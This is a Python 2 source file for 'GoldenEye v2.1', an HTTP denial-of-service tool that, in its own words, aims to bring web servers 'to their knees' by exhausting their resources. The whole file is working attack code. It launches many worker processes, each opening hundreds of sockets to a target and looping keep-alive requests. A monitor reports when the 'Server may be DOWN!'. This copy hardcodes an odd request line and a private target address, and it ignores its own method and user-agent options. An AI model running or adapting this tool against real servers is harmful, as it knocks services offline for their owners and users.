#!/usr/bin/env python

"""
$Id: $

     /$$$$$$            /$$       /$$                     /$$$$$$$$
    /$$__  $$          | $$      | $$                    | $$_____/
   | $$  \__/  /$$$$$$ | $$  /$$$$$$$  /$$$$$$  /$$$$$$$ | $$       /$$   /$$  /$$$$$$
   | $$ /$$$$ /$$__  $$| $$ /$$__  $$ /$$__  $$| $$__  $$| $$$$$   | $$  | $$ /$$__  $$
   | $$|_  $$| $$  \ $$| $$| $$  | $$| $$$$$$$$| $$  \ $$| $$__/   | $$  | $$| $$$$$$$$
   | $$  \ $$| $$  | $$| $$| $$  | $$| $$_____/| $$  | $$| $$      | $$  | $$| $$_____/
   |  $$$$$$/|  $$$$$$/| $$|  $$$$$$$|  $$$$$$$| $$  | $$| $$$$$$$$|  $$$$$$$|  $$$$$$$
    \______/  \______/ |__/ \_______/ \_______/|__/  |__/|________/ \____  $$ \_______/
                                                                     /$$  | $$
                                                                    |  $$$$$$/
                                                                     \______/



This tool is a dos tool that is meant to put heavy load on HTTP servers
in order to bring them to their knees by exhausting the resource pool.

This tool is meant for research purposes only
and any malicious usage of this tool is prohibited.

@author Jan Seidl <http://wroot.org/>

@date 2014-02-18
@version 2.1

@TODO Test in python 3.x

LICENSE:
This software is distributed under the GNU General Public License version 3 (GPLv3)

LEGAL NOTICE:
THIS SOFTWARE IS PROVIDED FOR EDUCATIONAL USE ONLY!
IF YOU ENGAGE IN ANY ILLEGAL ACTIVITY
THE AUTHOR DOES NOT TAKE ANY RESPONSIBILITY FOR IT.
BY USING THIS SOFTWARE YOU AGREE WITH THESE TERMS.
"""

from multiprocessing import Process, Manager, Pool
import urlparse, ssl
import socket
import sys, getopt, random, time, os

# Python version-specific
if  sys.version_info < (3,0):
    # Python 2.x
    import httplib
    HTTPCLIENT = httplib
else:
    # Python 3.x
    import http.client
    HTTPCLIENT = http.client

####
# Config
####
DEBUG = False

####
# Constants
####
METHOD_GET  = 'get'
METHOD_POST = 'post'
METHOD_RAND = 'random'

JOIN_TIMEOUT=1.0

DEFAULT_WORKERS=10
DEFAULT_SOCKETS=500

GOLDENEYE_BANNER = 'GoldenEye v2.1 by Jan Seidl <jseidl@wroot.org>'

USER_AGENT_PARTS = {
    'os': {
        'linux': {
            'name': [ 'Linux x86_64', 'Linux i386' ],
            'ext': [ 'X11' ]
        },
        'windows': {
            'name': [ 'Windows NT 6.1', 'Windows NT 6.3', 'Windows NT 5.1', 'Windows NT.6.2' ],
            'ext': [ 'WOW64', 'Win64; x64' ]
        },
        'mac': {
            'name': [ 'Macintosh' ],
            'ext': [ 'Intel Mac OS X %d_%d_%d' % (random.randint(10, 11), random.randint(0, 9), random.randint(0, 5)) for i in range(1, 10) ]
        },
    },
    'platform': {
        'webkit': {
            'name': [ 'AppleWebKit/%d.%d' % (random.randint(535, 537), random.randint(1,36)) for i in range(1, 30) ],
            'details': [ 'KHTML, like Gecko' ],
            'extensions': [ 'Chrome/%d.0.%d.%d Safari/%d.%d' % (random.randint(6, 32), random.randint(100, 2000), random.randint(0, 100), random.randint(535, 537), random.randint(1, 36)) for i in range(1, 30) ] + [ 'Version/%d.%d.%d Safari/%d.%d' % (random.randint(4, 6), random.randint(0, 1), random.randint(0, 9), random.randint(535, 537), random.randint(1, 36)) for i in range(1, 10) ]
        },
        'iexplorer': {
            'browser_info': {
                'name': [ 'MSIE 6.0', 'MSIE 6.1', 'MSIE 7.0', 'MSIE 7.0b', 'MSIE 8.0', 'MSIE 9.0', 'MSIE 10.0' ],
                'ext_pre': [ 'compatible', 'Windows; U' ],
                'ext_post': [ 'Trident/%d.0' % i for i in range(4, 6) ] + [ '.NET CLR %d.%d.%d' % (random.randint(1, 3), random.randint(0, 5), random.randint(1000, 30000)) for i in range(1, 10) ]
            }
        },
        'gecko': {
            'name': [ 'Gecko/%d%02d%02d Firefox/%d.0' % (random.randint(2001, 2010), random.randint(1,31), random.randint(1,12) , random.randint(10, 25)) for i in range(1, 30) ],
            'details': [],
            'extensions': []
        }
    }
}

####
# GoldenEye Class
####

class GoldenEye(object):

    # Counters
    counter = [0, 0]
    last_counter = [0, 0]

    # Containers
    workersQueue = []
    manager = None
    useragents = []

    # Properties
    url = None

    # Options
    nr_workers = DEFAULT_WORKERS
    nr_sockets = DEFAULT_SOCKETS
    method = METHOD_GET

    def __init__(self, url):

        # Set URL
        self.url = url

        # Initialize Manager
        self.manager = Manager()

        # Initialize Counters
        self.counter = self.manager.list((0, 0))


    def exit(self):
        self.stats()
        print "Shutting down GoldenEye"

    def __del__(self):
        self.exit()

    def printHeader(self):

        # Taunt!
        print
        print GOLDENEYE_BANNER
        print

    # Do the fun!
    def fire(self):

        self.printHeader()
        print "Hitting webserver in mode '{0}' with {1} workers running {2} connections each. Hit CTRL+C to cancel.".format(self.method, self.nr_workers, self.nr_sockets)

        if DEBUG:
            print "Starting {0} concurrent workers".format(self.nr_workers)

        # Start workers
        for i in range(int(self.nr_workers)):

            try:

                worker = Striker2(self.url, self.nr_sockets, self.counter)
                worker.useragents = self.useragents
                worker.method = self.method

                self.workersQueue.append(worker)
                worker.start()
            except (Exception):
                error("Failed to start worker {0}".format(i))
                pass

        if DEBUG:
            print "Initiating monitor"
        self.monitor()

    def stats(self):

        try:
            if self.counter[0] > 0 or self.counter[1] > 0:

                print "{0} GoldenEye strikes deferred. ({1} Failed)".format(self.counter[0], self.counter[1])

                if self.counter[0] > 0 and self.counter[1] > 0 and self.last_counter[0] == self.counter[0] and self.counter[1] > self.last_counter[1]:
                    print "\tServer may be DOWN!"

                self.last_counter[0] = self.counter[0]
                self.last_counter[1] = self.counter[1]
        except (Exception):
            pass # silently ignore

    def monitor(self):
        while len(self.workersQueue) > 0:
            try:
                for worker in self.workersQueue:
                    if worker is not None and worker.is_alive():
                        worker.join(JOIN_TIMEOUT)
                    else:
                        self.workersQueue.remove(worker)

                self.stats()

            except (KeyboardInterrupt, SystemExit):
                print "CTRL+C received. Killing all workers"
                for worker in self.workersQueue:
                    try:
                        if DEBUG:
                            print "Killing worker {0}".format(worker.name)
                        #worker.terminate()
                        worker.stop()
                    except Exception, ex:
                        pass # silently ignore
                if DEBUG:
                    raise
                else:
                    pass

####
# Striker Class
####

class Striker2(Process):


    # Counters
    request_count = 0
    failed_count = 0

    # Containers
    url = None
    host = None
    port = 80
    ssl = False
    referers = []
    useragents = []
    socks = []
    counter = None
    nr_socks = DEFAULT_SOCKETS

    # Flags
    runnable = True

    # Options
    method = METHOD_GET

    def __init__(self, url, nr_sockets, counter):

        super(Striker2, self).__init__()

        self.counter = counter
        self.nr_socks = nr_sockets

        parsedUrl = urlparse.urlparse(url)

        if parsedUrl.scheme == 'https':
            self.ssl = True

        self.host = parsedUrl.netloc.split(':')[0]
        self.url = parsedUrl.path

        self.port = parsedUrl.port

        if not self.port:
            self.port = 80 if not self.ssl else 443


        self.referers = [
            'http://www.google.com/',
            'http://www.bing.com/',
            'http://www.baidu.com/',
            'http://www.yandex.com/',
            'http://' + self.host + '/'
            ]


    def __del__(self):
        self.stop()


    #builds random ascii string
    def buildblock(self, size):
        out_str = ''

        _LOWERCASE = range(97, 122)
        _UPPERCASE = range(65, 90)
        _NUMERIC   = range(48, 57)

        validChars = _LOWERCASE + _UPPERCASE + _NUMERIC

        for i in range(0, size):
            a = random.choice(validChars)
            out_str += chr(a)

        return out_str


    def run(self):

        if DEBUG:
            print "Starting worker {0}".format(self.name)

        while self.runnable:

            try:

                for i in range(self.nr_socks):

                    if self.ssl:
                        #c = HTTPCLIENT.HTTPSConnection(self.host, self.port)
                        c = clientsocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        clientsocket.connect((self.host, self.port))
                    else:
                        #c = HTTPCLIENT.HTTPConnection(self.host, self.port)
                        c =  socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        c.connect((self.host, self.port))
                    self.socks.append(c)

                for conn_req in self.socks:

                    CRLF = '\r\n'
                    message='ON /generator HTTP/1.1'+CRLF+'Host: 192.168.3.104:8080'+CRLF+'Connection: keep-alive'+CRLF+CRLF
                    conn_req.send(message)
                self.closeConnections()

            except:
                self.incFailed()
                if DEBUG:
                    raise
                else:
                    pass # silently ignore

        if DEBUG:
            print "Worker {0} completed run. Sleeping...".format(self.name)

    def closeConnections(self):
        for conn in self.socks:
            try:
                conn.close()
            except:
                pass # silently ignore

    # Housekeeping
    def stop(self):
        self.runnable = False
        self.closeConnections()
        self.terminate()

    # Counter Functions
    def incCounter(self):
        try:
            self.counter[0] += 1
        except (Exception):
            pass

    def incFailed(self):
        try:
            self.counter[1] += 1
        except (Exception):
            pass



####

####
# Other Functions
####

def usage():
    print
    print '-----------------------------------------------------------------------------------------------------------'
    print
    print GOLDENEYE_BANNER
    print
    print ' USAGE: ./goldeneye.py <url> [OPTIONS]'
    print
    print ' OPTIONS:'
    print '\t Flag\t\t\tDescription\t\t\t\t\t\tDefault'
    print '\t -u, --useragents\tFile with user-agents to use\t\t\t\t(default: randomly generated)'
    print '\t -w, --workers\t\tNumber of concurrent workers\t\t\t\t(default: {0})'.format(DEFAULT_WORKERS)
    print '\t -s, --sockets\t\tNumber of concurrent sockets\t\t\t\t(default: {0})'.format(DEFAULT_SOCKETS)
    print '\t -m, --method\t\tHTTP Method to use \'get\' or \'post\'  or \'random\'\t\t(default: get)'
    print '\t -d, --debug\t\tEnable Debug Mode [more verbose output]\t\t\t(default: False)'
    print '\t -h, --help\t\tShows this help'
    print
    print '-----------------------------------------------------------------------------------------------------------'


def error(msg):
    # print help information and exit:
    sys.stderr.write(str(msg+"\n"))
    usage()
    sys.exit(2)

####
# Main
####

def main():

    try:

        if len(sys.argv) < 2:
            error('Please supply at least the URL')

        url = sys.argv[1]

        if url == '-h':
            usage()
            sys.exit()

        if url[0:4].lower() != 'http':
            error("Invalid URL supplied")

        if url == None:
            error("No URL supplied")

        opts, args = getopt.getopt(sys.argv[2:], "dhw:s:m:u:", ["debug", "help", "workers", "sockets", "method", "useragents" ])

        workers = DEFAULT_WORKERS
        socks = DEFAULT_SOCKETS
        method = METHOD_GET

        uas_file = None
        useragents = []

        for o, a in opts:
            if o in ("-h", "--help"):
                usage()
                sys.exit()
            elif o in ("-u", "--useragents"):
                uas_file = a
            elif o in ("-s", "--sockets"):
                socks = int(a)
            elif o in ("-w", "--workers"):
                workers = int(a)
            elif o in ("-d", "--debug"):
                global DEBUG
                DEBUG = True
            elif o in ("-m", "--method"):
                if a in (METHOD_GET, METHOD_POST, METHOD_RAND):
                    method = a
                else:
                    error("method {0} is invalid".format(a))
            else:
                error("option '"+o+"' doesn't exists")


        if uas_file:
            try:
                with open(uas_file) as f:
                    useragents = f.readlines()
            except EnvironmentError:
                    error("cannot read file {0}".format(uas_file))

        goldeneye = GoldenEye(url)
        goldeneye.useragents = useragents
        goldeneye.nr_workers = workers
        goldeneye.method = method
        goldeneye.nr_sockets = socks

        goldeneye.fire()

    except getopt.GetoptError, err:

        # print help information and exit:
        sys.stderr.write(str(err))
        usage()
        sys.exit(2)

if __name__ == "__main__":
    main()
